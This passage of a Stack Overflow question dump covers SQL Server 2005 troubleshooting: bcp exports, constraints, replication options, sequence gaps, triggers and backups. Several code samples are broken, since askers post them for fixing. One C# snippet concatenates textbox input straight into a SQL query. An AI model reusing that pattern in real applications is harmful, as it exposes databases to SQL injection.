sql?</p>\n"},{"tags":["sql","sql-server","debugging","sql-server-2005","bcp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":293,"score":1,"question_id":12140947,"title":"Using bcp utility to export SQL queries to a text file","body":"<p>I debug a stored procedure (SQL Server 2005) and I need to find out some values in a datatable.</p>\n\n<p>The procedure is run by an event of the application and I watch just the debugging output.</p>\n\n<p>I do the following my stored procedure (SQL Server 2005), I took a system table (master.dbo.spt_values) as example:</p>\n\n<pre><code>set @logtext = 'select name, type from master.dbo.spt_values where number=6'\n--set @logtext = 'master.dbo.spt_values'\nSET @cmd = 'bcp ' + @logtext + ' out \"c:\\spt_values.dat\" -U uId -P uPass -c'\nEXEC master..XP_CMDSHELL @cmd \n</code></pre>\n\n<p>So, when I uncomment the second like everything works, a file apprears on the C:\\ drive... but if I coment it back leaving only the first line, any output is generated. </p>\n\n<p>How to fix this problem?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12138979,"title":"Query SQL Server resources per user/application","body":"<p>I understand there is no easy way to query resource usage (cpu time, disk reads/writes) per database, but is there a way to query that information per specific connection string or user?</p>\n\n<p>I'm building an ASP.Net MVC3 application that uses Entity Framework to connect to a SQL Server database; I'm using the standard edition. I would like to know what my application costs on the database server.</p>\n"},{"tags":["java","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":92,"score":3,"question_id":12139012,"title":"Difference between SQL Date&Time and java Date&Time and which should be used?","body":"<p>I need to update a record with date and time, but I am confused to use either CURRENT_TIMESTAMP of sql server 2005 or date object of JAVA, both gives me the same result.</p>\n\n<p>example:</p>\n\n<pre><code>select CURRENT_TIMESTAMP\n</code></pre>\n\n<p>this will print <code>2012-08-27 14:30:17.193</code></p>\n\n<p>and this java code below will also do the same visibly but what is the difference.</p>\n\n<pre><code>           Date dNow = new Date( );\n           SimpleDateFormat ft = \n           new SimpleDateFormat (\"yyyy-MM-dd HH:mm:ss.SSS \");\n\n           System.out.println(\"Current Date: \" + ft.format(dNow));\n</code></pre>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>I have 2 prepareStatement below for while I have used CURRENT_TIMESTAMP and for the 2nd one I have used date object of JAVA (the date object let it be either util.Date or sql.Date).</p>\n\n<p><strong>statement1</strong></p>\n\n<pre><code>  pst = con.prepareStatement(\"insert into sLog(logUser, logType, logSystem, logTime)\n             values(?, ?, ?, CURRENT_TIMESTAMP)\");\n                    pst.setString(1, logUser);\n                    pst.setString(2, logType);\n                    pst.setString(3, logSystem);\n                    pst.executeUpdate();\n</code></pre>\n\n<p><strong>statement2</strong></p>\n\n<pre><code>pst = con.prepareStatement(\"insert into sLog(logUser, logType, logSystem, logTime)\n             values(?, ?, ?, ?)\");\n                pst.setString(1, logUser);\n                pst.setString(2, logType);\n                pst.setString(3, logSystem);\n                pst.setString(4, format(dNow));\n                pst.executeUpdate();\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","query"],"answer_count":6,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":12458,"score":4,"question_id":2965837,"title":"INSERT statement conflicted with the FOREIGN KEY constraint","body":"<p>I am getting the following error. Could you please help me in ?</p>\n\n<pre><code>Msg 547, Level 16, State 0, Line 1\nThe INSERT statement conflicted with the FOREIGN KEY constraint \"FK_Sup_Item_Sup_Item_Cat\". The conflict occurred in database \"dev_bo\", table \"dbo.Sup_Item_Cat\".\nThe statement has been terminated.\n\n\ninsert into sup_item (supplier_id,sup_item_id,name,sup_item_cat_id,status_code,last_modified_user_id,last_modified_timestamp,client_id) values(10162425,10,'jaiso','123123','a','12','2010-12-12','1062425')\n</code></pre>\n\n<p>the last coulum \"client_id\" i am getting the conflict. I tried to put the value which already exists in the dbo.Sup_Item_Cat to the column</p>\n\n<p>corresponding to the sup_item.. but no joy :-(</p>\n"},{"tags":["sql-server-2005","ssms","sql-server-2005-express"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":305,"score":1,"question_id":3855332,"title":"Same name tables under different schemas with SQL Server 2005 Management Studio Express","body":"<p>I know how to create a new schema and write a DDL script to create tables with the same name that reside in different schemas in the same database. I want to know how to do that using SQL Server 2005 Management Studio Express.</p>\n\n<p>To repeat, I want to know if I can create two tables having the same name but residing in different schemas of the same database using SQL Server 2005 Management Studio Express.</p>\n"},{"tags":["database","sql-server-2005","synchronization","syncframework","service-broker"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1753,"score":1,"question_id":2152385,"title":"Replication vs Sync Framework vs Service Broker","body":"<p>I've asked about each of these technologies separately, and really haven't found a suitable answer.</p>\n\n<p>We have a server in our central office running SQL Server 2005 Enterprise that has several large (large in the sense that DSL is the limiting factor) databases that we need local copies of at each of our locations.  We currently have a few dozen locations, and are needing to bring even more online.  The total number of locations we'll need to sync these databases to will be in the several hundreds in the next 2 years.</p>\n\n<p>We are trying to overcome issues with the WAN connection at each location.  These are DSL lines and the wiring at the locations isn't always the best.  We currently have issues with some of the locations going down as often as every hour.  While we are working to resolve these issues with rewiring and assistance from the local telcos, it mainly highlights the problem at hand: we need a two-way sync that can handle being occasionally-connected.</p>\n\n<p>We tried transactional replication for a while, and while it worked some of the time, it was too high maintenance for us, and it seemed to randomly error out often with no possible explanations, forcing us to reinitialize subscriptions (which could take upwards of 4 hours assuming the location would stay connected long enough to get the entire snapshot in one go).  We've looked at rolling our own solution from scratch, but I don't feel this would be the best idea given the scale and reliability we are needing.</p>\n\n<p>So far we've also looked at Sync Framework, and as suggested by someone else, Service Broker.  Sync Framework seems a better fit, but I was told that Service Broker scales better and is more reliable?  I can't find any empirical data on the overhead involved with Sync Framework or Service Broker, so it's proving impossible to compare the two in this regard.</p>\n\n<p>What we really need is a two-way sync between the central office server and a remote client that can run autonomously and can report to an admin in the event of a failure that requires our intervention.</p>\n\n<p>There are so many possible solutions to this problem, all involving completely different technologies, that I need a fresh eye on this.</p>\n\n<p>What do you think would be the optimal solution for our situation, and why?</p>\n\n<p>EDIT: Obviously, upgrading to SQL Server 2008 would solve this problem easily.  However, we would like to try to less expensive options first.</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12136088,"title":"T-SQL Average of Table Subset","body":"<p>I have a table (in SQL Server 2005) of daily weather data for a single location which includes these columns:</p>\n\n<pre><code>LogDate                 DATETIME  \nHighTemp                INT  \nTemp6MonthHighAverage   INT  \n</code></pre>\n\n<p><code>LogDate</code> and <code>HighTemp</code> have data. <code>HighTemp6MonthAverage</code> will be populated with, as the name suggests, the average high temperature for the 6 months ending in <code>LogDate</code>.</p>\n\n<p>There are similar requirements for LowTemp, as well as humidity and several other items, for data spanning decades.</p>\n\n<p>I find myself thinking in circles.  Can I derive this average for each row in an UPDATE statement using set operations, or do I need to implement a solution with cursors? I will appreciate any suggestions.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","indexing"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12134940,"title":"Need help on indexing using SQL server 2005","body":"<p>I have a table, <code>paymentdetails</code>, with a column <code>paymentstatus</code> (has a check constraint restricting values to either paid or pending). Also, a table <code>patientdetails</code>, that holds patientid, address......columns</p>\n\n<p>I want to create an index that speeds up the execution of extracting the patient details for each patient whose initial payment is pending.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12126384,"title":"sql server 2005 constraints and validations","body":"<p>I have a table that stores payment details with columns: (<code>paymentmethod</code>- which is in either check, cash or creditcard), (<code>Checknumber</code>), (<code>Cardholdersname</code>), (<code>creditcardnumber</code>). </p>\n\n<p>Question is: how do I validate that when <code>paymentmethod</code> is <code>cash</code> or check then <code>Cardholdersname</code>, <code>creditcardnumber</code> should be left blank and when <code>paymentmethod</code> is <code>creditcard</code> then <code>Checknumber</code> should be left blank.</p>\n"},{"tags":["asp.net","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":107,"score":0,"question_id":12131631,"title":"Validation before bulkinsert in sql server","body":"<p>I want to import data from text file.which contain arround lakhs of records</p>\n\n<p>I am using bulk insert do it like this</p>\n\n<pre><code>BULK\nINSERT vw_bulk_insert_test\nFROM '\\\\server\\c$\\csvtext.txt'--\\\\server\\SQLEXPRESS\\csvtest.txt'\nWITH\n(FIRSTROW=2,\ncheck_CONSTRAINTS,\nFIELDTERMINATOR = '~',\nROWTERMINATOR = '\\n'\n)\nGO\n</code></pre>\n\n<p>But before insert I want to validate values of each column without using cursor.Like if second row will have values of all fields except unit_number(Column) then it should create a error log specifying unit_number value is missing.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12123737,"title":"How can I modify the size of a varchar?","body":"<p>I need to know if there is any way i can modify the size of a varchar from <code>varchar(40)</code> to <code>varchar(60)</code> and also add this constraint:</p>\n\n<pre><code>(( CASE WHEN DATEDIFF(day,Date_Election_President,CURRENT_TIMESTAMP) &gt;= 730 THEN\n             'NON'\n        ELSE 'OUI'\n   END ))\n</code></pre>\n"},{"tags":["asp.net","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":202,"score":0,"question_id":12129955,"title":"Insert, Delete, Update table without using grid control in asp.net","body":"<p>How to insert, delete, update etc without using data grid server control in asp.net </p>\n"},{"tags":["c#","sql-server-2005","winapp"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12129285,"title":"Connect to database from local network","body":"<p>I share two computer with local network</p>\n\n<ul>\n<li>computer1 : Windows XP, ip = 192.168.0.1</li>\n<li>computer2 : Windows 7 , ip = 192.168.0.2</li>\n</ul>\n\n<p>Now I want to connect to a SQL Server 2005 database that exists on <code>computer1</code> from <code>copmuter 2</code>  with a win app</p>\n\n<p>I use below connection string and check <code>Surface Area Configuration for Services and Connections</code> but I get an error:</p>\n\n<blockquote>\n  <p><em>A network-related or instance-specific error occurred while\n  establishing a connection to SQL Server. The server was not found or\n  was not accessible.Verify that the instance name is correct and that\n  SQL Server is configured to allow remote connections.SQL Network\n  Interfaces, error: 26 - Error Locating Server/Instance Specified</em></p>\n</blockquote>\n\n<p>Connection string:</p>\n\n<pre><code>Data Source=192.168.0.1;Initial Catalog=DBName;Integrated Security=True\n</code></pre>\n\n<p>and</p>\n\n<pre><code>Data Source=192.168.0.1;Initial Catalog=DBName;Integrated Security=false\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","stored-procedures","view"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12129057,"title":"Can't use ORDER BY when SELECTing from a view in a stored procedure","body":"<p>I have a view and while I can execute this statement without any error:</p>\n\n<pre><code>SELECT * from vwShippingNoticeBase\norder by InvoiceNum\n</code></pre>\n\n<p>when I try to make a stored procedure out of this exact same statement, I get an error:</p>\n\n<pre><code>create PROCEDURE [dbo].[upSELECT_shippingNoticeOrderByInvoiceNum]\nAS\nBEGIN\nSET NOCOUNT ON;\nSELECT * FROM vwShippingNoticeBase\norder by invoiceNum\n</code></pre>\n\n<p>Error:</p>\n\n<blockquote>\n  <p>Msg 102, Level 15, State 1, Procedure upSELECT_shippingNoticeByDateRange, Line 7<br>\n  Incorrect syntax near 'invoiceNum'.</p>\n</blockquote>\n\n<p>Very strange!</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":106,"score":1,"question_id":12088032,"title":"View Missing Numbers in a Sequence by date","body":"<p>I have a table name \"Numerator\" has 3 columns: No_Fact, Numerat and Date. Like this:</p>\n\n<pre><code>No_Fact         Numerat         Date\n1207020015      000713          2012-07-02 00:00:00.000\n1207020016      000720          2012-07-02 00:00:00.000\n1207020017      000722          2012-07-02 00:00:00.000\n1207020019      000723          2012-07-02 00:00:00.000\n1207020022      000724          2012-07-02 00:00:00.000\n1207020021      000733          2012-07-02 00:00:00.000\n1207020020      000734          2012-07-02 00:00:00.000\n1207020018      000735          2012-07-02 00:00:00.000\n1208120001      000766          2012-08-12 00:00:00.000\n1208120002      000769          2012-08-12 00:00:00.000\n1208230001      000777          2012-08-23 00:00:00.000\n1208230002      000780          2012-08-23 00:00:00.000\n</code></pre>\n\n<p>I want to view some missing numbers between numbers inside Numerat column, so I have tried using the code that is:</p>\n\n<pre><code>SELECT A.Numerat+1 AS 'MISSING FROM', MIN(B.Numerat)-1 AS 'TO'\nFROM Numerator A, Numerator B\nWHERE A.Numerat &lt; B.Numerat\nGROUP BY A.Numerat\nHAVING A.Numerat+1 &lt; MIN(B.Numerat)\nORDER BY 1\n</code></pre>\n\n<p>And result set:</p>\n\n<pre><code>MISSING FROM   TO\n714            719 \n721            721\n725            732\n736            765\n767            768\n770            776\n778            779\n</code></pre>\n\n<p>This is a code that nice.\nBut the sequence numbers is too many, to be incompatible with the need to be concise. So I only want to show part rows today (2012-08-23) only, likes this:</p>\n\n<pre><code>MISSING FROM   TO\n778            779\n</code></pre>\n\n<p>I am very grateful to anyone who can decode it, Thank You.</p>\n\n<p>There's an interesting thing when the next line in the insert in the table,\nI show began on August 23 2012:</p>\n\n<pre><code>No_Fact         Numerat         Date\n1208230001      000777          2012-08-23 00:00:00.000\n1208230002      000780          2012-08-23 00:00:00.000\n1208250001      000782          2012-08-25 00:00:00.000\n1208250002      000783          2012-08-25 00:00:00.000\n1208250003      000784          2012-08-25 00:00:00.000\n1208250004      000785          2012-08-25 00:00:00.000\n1208250005      000786          2012-08-25 00:00:00.000\n1208250006      000788          2012-08-25 00:00:00.000\n1208250007      000789          2012-08-25 00:00:00.000\n1208250008      000790          2012-08-25 00:00:00.000\n1208250009      000793          2012-08-25 00:00:00.000\n1208250010      000794          2012-08-25 00:00:00.000\n</code></pre>\n\n<p>As my original purpose, that I want to see the missing numbers in the Numerat column and to summarily I only just wanted to show a line I enter this day alone, then with advice from bluefeet I use the following code:</p>\n\n<pre><code>SELECT A.Numerat+1 AS 'MISSING FROM', MIN(B.Numerat)-1 AS 'TO'\nFROM Numerator A\nINNER JOIN Numerator B\n  ON A.Numerat &lt; B.Numerat\n  AND a.Tanggal = DATEADD(DAY, DATEDIFF(DAY, 0, GetDate()), 0)\nGROUP BY A.Numerat\nHAVING A.Numerat+1 &lt; MIN(B.Numerat)\nORDER BY 1\n</code></pre>\n\n<p>and achieving results:</p>\n\n<pre><code>MISSING FROM   TO\n787            787\n791            792\n</code></pre>\n\n<p>If we look carefully there is a missing number that does not appear, that is:</p>\n\n<pre><code>MISSING FROM   TO\n781            781\n</code></pre>\n\n<p>But we do not know exactly, including the date do it? Is 23 or 25. In this case it is not important to know exactly falls on what the date this missing number, obviously there is one number missing, it should be noted, and due on the 24th of all public holidays, let us enter it on the 25th. Can anyone help?</p>\n"},{"tags":["c#","asp.net","sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":102,"score":0,"question_id":12118888,"title":"How to retrieve records using textbox?","body":"<p>I am trying to use the wildcard query to display rows in a gridview but it is not up to the mark...</p>\n\n<pre><code>protected void Button1_Click(object sender, EventArgs e)\n{\n    SqlCommand com = new SqlCommand(\"select * from Alphabates where Word \n                     like'\"+TextBox1.Text+\"'\", new SqlConnection(\"data source=\n                     USER\\\\SQLEXPRESS;initial catalog=vicky;integrated \n                     security=true\"));\n\n    try\n    {\n        com.Connection.Open();\n        GridView1.DataSource = com.ExecuteReader();\n        GridView1.DataBind();\n        com.Connection.Close();\n        com.Connection.Dispose();\n    }\n    catch (SqlException ex)\n    {\n        Label1.Text = ex.Message;\n    }\n}\n</code></pre>\n"},{"tags":["sql","sql-server-2005","linked-server"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":10481,"score":2,"question_id":2493866,"title":"Create View using Linked Server db in SQL Server","body":"<p>How can I create View on Linked Server db. For Example I have a linked server [0.0.0.0] on [1.1.1.1]. Both db servers are SQL Sserver 2005. I want to create View on [1.1.1.1] using table on linked server.</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>On creating using full name, [0.0.0.0].db.dbo.table, I am getting this error.</p>\n\n<p>SQL Execution Error.</p>\n\n<p>Executed SQL statement: SELECT * FROM  0.0.0.0.db.dbo.table <strong><em>(YOu can see brackets are not there.)</em></strong>\nError Source: .Net SqlClient Data Provider\nError Message: Incorrect syntax near '0.0'. ---> part of IP address.</p>\n\n<p><img src=\"http://img406.imageshack.us/img406/4896/linkedserver.png\" alt=\"alt text\"></p>\n\n<p>I am just creating this in ManagementStudio, not using it because it is not created yet. I Have changed IP. In image you can see there are not brackets around IP but I given it and on error these brackets are removed.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12111560,"title":"Doing self join to hide duplicates - getting error message","body":"<p>Ok, I'm doing a self query to suppress duplicates for a view. The code I'm using is:</p>\n\n<pre><code>    USE BILLING\n\n    SELECT Provider_Code,\n           Provider_LName,\n           Provider_Fname,\n           Provider_Title,\n           AGENCY_LOCATION_NAME_LINE_1,\n           CostCenter_AbbrName\n    FROM   dbo.ServiceProfiler prov1\n           INNER JOIN\n           dbo.ServiceProfiler prov2\n           ON prov1.Provider_Code = prov2.Provider_Code\n    WHERE  0 = (SELECT COUNT(s1.Provider_Code)\n                FROM   prov1\n                WHERE  prov2.Provider_Code = prov1.Provider_Code\n                       AND prov2.Provider_Code &lt; prov1.Provider_Code);\n</code></pre>\n\n<p>When executing the query on SQL Server 2005 I get the message:</p>\n\n<blockquote>\n  <p><em>Msg 208, Level 16, State 1, Line 3<br>\n  Invalid object name 'prov1'.</em></p>\n</blockquote>\n\n<p>I cannot for the life of me understand why the alias names are invalid. I think I found a similar question <a href=\"http://stackoverflow.com/questions/9762390/converting-a-self-subquery-to-a-self-join\">here</a>. But it's very generic and doesn't show a full 'real' query using the aliases.</p>\n\n<p>TIA for any help you can give.</p>\n"},{"tags":["sql-server-2005","time","case-statement"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12111296,"title":"SQL Subtracting OverNight Time (returning only minutes) Get rid of negative time?","body":"<p>I have a bunch of start and end times:</p>\n\n<pre><code>    Start       End         Delta\n    20:47:22    22:47:02    120\n    22:49:12    0:48:47    -1321\n    0:50:42     2:50:22     120\n    ...\n    23:11:07    2:10:44    -1261\n</code></pre>\n\n<p>The code I use is as follows (as time is a varchar)</p>\n\n<pre><code>  CONVERT(VARCHAR(8), DATEDIFF(minute, max(max_time), min(min_time)) ,114) \n  as delta_time,\n</code></pre>\n\n<p>But as you can see, because it is overnight the result is negative.  Any thoughts about getting the right result of 119 minutes and 179 minutes (in the example above).  </p>\n\n<p>I thought of using a case statement that checks when the delta is negative.  If it is negative, add 24 hours to the End time then try the subtracting.</p>\n\n<pre><code> CASE WHEN DATEDIFF(minute, max(max_time), min(min_time)) &lt; 0 THEN  \n DATEADD(minute, 1440, min(min_time)) \n ELSE 0 END AS deltatest\n</code></pre>\n\n<p>However this code doesn't work, as SQL Server just changes the time to: 1900-01-02 00:48:47.000 (the next day, not something like 24:48:47, which is what I want).  Any thoughts?  Is there any method to add a convert to the CASE statement?? Thanks.</p>\n"},{"tags":["sql-server-2005","duplicates","cross-join","having-clause"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12110683,"title":"Cross Join with always the same string message","body":"<p>I am using Microsoft SQL Server 2005.</p>\n\n<p>I would like to have a table in output with a column regarding duplicate values in cross join with a table containing only a column with the same string message.\nI think the cross join with a \"string message\" should be the proper way to do it.</p>\n\n<p>Why the following script is not working?</p>\n\n<pre><code>DECLARE @IN_CodesTable TABLE\n   (\n        CodesValues           NVARCHAR(60)\n   )\nINSERT INTO @IN_CodesTable VALUES('CODE_BB^&amp;')\nINSERT INTO @IN_CodesTable VALUES('CODE_1234')\nINSERT INTO @IN_CodesTable VALUES('CODE_BB^&amp;')\nINSERT INTO @IN_CodesTable VALUES('CODE_$%^&amp;')\nINSERT INTO @IN_CodesTable VALUES('CODE_BB^&amp;')\nINSERT INTO @IN_CodesTable VALUES('CODE_BB^&amp;')\nINSERT INTO @IN_CodesTable VALUES('CODE_1234')\n\nSELECT *\nFROM   \n(\nSELECT DISTINCT CodesTable\nFROM @IN_CodesTable\nWHERE CodesTable IN\n                    ( SELECT  CodesValues\n                    FROM     @IN_CodesTable\n                    GROUP BY CodesTable\n                    HAVING   COUNT(*) &gt; 1\n                    )\n)\nCROSS JOIN\n( \n    SELECT 'You have duplicates!' AS DupMessage\n)\n</code></pre>\n"},{"tags":["sql","internet-explorer","sql-server-2005","vbscript","activex"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12088243,"title":"ActiveX calling URL page","body":"<p>I'm using the following code inside an <code>ActiveX Script</code> job on SQl Server to call an URL every X minutes.</p>\n\n<pre><code>Dim WshShell\nSet WshShell = CreateObject(\"WScript.Shell\")\nWshShell.Run \"iexplore.exe http://www.google.com.br\"\nSet WsShell = Nothing\n</code></pre>\n\n<p>it is working but the processes created keep running:\n<img src=\"http://i.stack.imgur.com/ntMt3.jpg\" alt=\"enter image description here\"></p>\n\n<p>Any way of changin that code to call the URL and kill the recent called process or call it with a \"time-to-live\". I think it is more secure, I wouldn't want to kill the wrong process.</p>\n"},{"tags":["sql","tsql","sql-server-2005","unpivot"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":101,"score":0,"question_id":12108680,"title":"TSQL Select all columns without first n from function/procedure","body":"<p>I know this may sounds silly but I would like to create function that will process data from tables with different size.</p>\n\n<p>Lets say I have first table like so:</p>\n\n<pre><code>ID    IRR     M0    M1\n----------------------\n 1      0    -10     5\n 2      0    -20    10\n 3      0   -100   100\n 4      0    -10     0\n</code></pre>\n\n<p>And second table like so:</p>\n\n<pre><code>ID    IRR     M0    M1    M2\n----------------------------\n 1      0    -10     5    60\n 2      0    -20    10     0\n 3      0   -100   100   400\n 4      0    -10     0    10\n</code></pre>\n\n<p>I would like to create function that will be able to process data from both tables.</p>\n\n<p>I know that first column contains ID, second IRR, rest of columns will hold cash flow for specific month.</p>\n\n<p>Function should be able to process all columns instead of first 2 and store result in second column.</p>\n\n<p>I know that I can get all columns from specific table with:</p>\n\n<pre><code>SELECT COLUMN_NAME \nFROM INFORMATION_SCHEMA.columns \nWHERE TABLE_NAME = 'First_Table'\n</code></pre>\n\n<p>Problems begin when I would like to create function that will return those columns as rows. </p>\n\n<p>I can create function like so:</p>\n\n<pre><code>CREATE FUNCTION UnpivotRow (@TableName  varchar(50), @FromWhichColumn int, @Row int)\nRETURNS @values TABLE\n(\n    id INT IDENTITY(0, 1),\n    value DECIMAL(30, 10)\n)\n...\n</code></pre>\n\n<p>But how this function should look?</p>\n\n<p>I think that ideal for this kind of processing table should look like so:</p>\n\n<pre><code>ProjectID    TimePeriod    Value\n--------------------------------\n        1             0      -10\n        1             1        5\n        2             0      -20\n        2             1       10\n        3             0     -100\n        3             1      100\n        4             0      -10\n        4             1        0\n</code></pre>\n\n<p><strong>I need to unpivot whole table without knowing number of columns.</strong> </p>\n\n<hr>\n\n<p><strong>EDIT:</strong>\nIf this can't be done inside function, then maybe inside a procedure?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":35,"score":2,"question_id":12108548,"title":"Why backup sql server query is not working without variable?","body":"<p>it is working......</p>\n\n<pre><code>declare @dbName varchar(50)\nset @dbName='myDb'\n    BACKUP DATABASE @dbName TO DISK = 'c:\\backup\\myDb.bak'\n</code></pre>\n\n<p>But\nWhy is it not working? where as both are similar query.</p>\n\n<pre><code> BACKUP DATABASE 'mydb' TO DISK = 'c:\\backup\\myDb.bak'\n</code></pre>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":12104893,"title":"Transaction for sql query stored in temp table","body":"<p>I have a stored procedure build update query and store in temp table each time in loop. </p>\n\n<p>Total query built UNKNOWN (2 to 4)</p>\n\n<p>How can I put multi query in a transaction?</p>\n\n<p>For example, temp table contains following rows in column <code>EXPSQL</code> (<code>nvarchar</code>)</p>\n\n<pre><code>id   EXPSQL\n1    Update tableA SET Name = 'Test' WHERE id=1\n2    Update tableB SET Name = 'Test2' WHERE id=10\n</code></pre>\n\n<p>How can I begin a transaction for a loop to exec above query? or is there any other way?</p>\n\n<pre><code>while @id &lt; total\nbegin\n    set @id = @id +1\n    select @SQL = EXPSQL FROM #TEMPTABLE WHERE id=@id\n    EXEC (@SQL)\nend\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["sql-server","sql-server-2005","ssas","business-intelligence"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":9363404,"title":"SSAS 2005 MDX expression with .all attributes","body":"<p>I have the following measure calculation:</p>\n\n<pre><code>            CREATE MEMBER CURRENTCUBE.[Measures].[SOR - Sold Out Rate]\n            AS IIF(\n                 ([Measures].[SOR - Quantity] = 0) \n                 ,NULL\n                 ,[Measures].[SOR - Sold Out Positions]\n                  /\n                  ([Measures].[SOR - Quantity]\n                     , [Dim Core].[Core].[All] \n                         , [Dim More].[More].[All]\n                        , [Dim Extended].[Extended].[All]\n                        , [Dim Point Of Sales].[Point Of Sales].[All]\n                        , [Dim Point Of Sales Type].[POS Type].[All]\n                        , [Dim Product].[Product].[All]\n                        , [Dim Product AVA Status].[AVA Status].[All]\n                        , [Dim Product AVA Type].[AVA Type].[All]\n                        , [Dim Product Category].[Product Category].[All]\n                     , [Dim Calendar].[Gregorian Calendar].CurrentMember\n                   )\n                ), \n            FORMAT_STRING = \"Percent\", \n            VISIBLE = 1 ,  ASSOCIATED_MEASURE_GROUP = 'Fact Sold Out Rate'  ;  \n</code></pre>\n\n<p>What is the [Dim <em>].[</em>].[All] meaning? I am dividing by a quantity that is calculated previously okay, but I cannot manage to understand the use of the attributes with .all?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","vb6"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":267,"score":0,"question_id":12087277,"title":"How to add new record with primary key constraint VB6.0 & SQL Server","body":"<p>I want to create a message box that will fire whenever the txt_unit is equals to the unit_no in the database. This is during the insertion of new data in the DB. I'm using VB6 and SQL Server 2005.<br>\nThis is my code:</p>\n\n<p>If txt_unit.Text = 'same unit number that exist in the DB' Then\nMsgBox \"Duplicate Record\", vbCritical, \"Duplicate\"<br>\ntxt_unit.Text = \"\"<br>\ntxt_unit.SetFocus</p>\n\n<p>This will save time for the user during data input.\nThanks in advance</p>\n"},{"tags":["sql","debugging","sql-server-2005","export"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":91,"score":1,"question_id":12104880,"title":"Export the SELECT to a text file","body":"<p>I debug a SQL Server 2005 Stored Procedure, and have a query like <code>SELECT * FROM MY_TABLE INNER JOIN OTHER_TABLE etc</code>.</p>\n\n<p>How can I do to export the results of this query to a txt file?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":114,"score":-1,"question_id":12084684,"title":"sum with a trigger","body":"<p>There are 3 tables:</p>\n\n<pre><code>Suppl, fields: (Code_name,  Tasknum, Pki_num, Group_eng, Name, Descr, Cost, Quan, shop)\nMaker, fields : (Code_maker, Code_maker_arch, Code_name, provider)\nArrival, fields: (Code_arr, Code_maker, quan_arr)\n</code></pre>\n\n<p>I need to get a table (for export to Excel), for example update_501 (Group_eng, Name, Descr, quan_arr), which will contain a unique \"Descr\" by a group_eng_501. The field \"quan_arr\" needs to keep the sum of the field from the table Arrival.quan_arr for each unique \"Descr\".</p>\n\n<p>first:</p>\n\n<pre><code>Insert dbo.update_501(Group_eng, Name, Descr)\nselect Group_eng, Name, Descr\nfrom Suppl\nwhere (Group_eng = 501)\ngroup by Group_eng, Name, Descr\n</code></pre>\n\n<p>then:\ntrigger, which adds a unique \"descr\" to update_501</p>\n\n<pre><code>ALTER trigger [update_pki_501] ON [dbo].[Suppl]\nAfter Insert\nas\nbegin\nSet nocount on;\nif (not(exists(select * from [INSERTED])))\nreturn;\n\nInsert dbo.update_501(Group_eng, Name, Descr)\nselect I.Name\n      ,I.Descr\n      ,I.Group_eng\nfrom Inserted I\nwhere (I.Group_eng = 501)\n and not exists(select * from dbo.update_501 x where x.Group_eng=I.Group_eng and x.Descr = I.Descr) \nend\n</code></pre>\n\n<p>Please, help with a trigger that will add(and sum) in the update_501.quan_arr from Arrival.quan_arr</p>\n"},{"tags":["c++","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12101779,"title":"Function doesn't return new record index","body":"<p>I'm using ADO to work with MS SQL server. I'm trying to add new record to a table. For this moment function work fine. But when I want to get id - in FieldID only zero.\n</p>\n\n<pre><code>    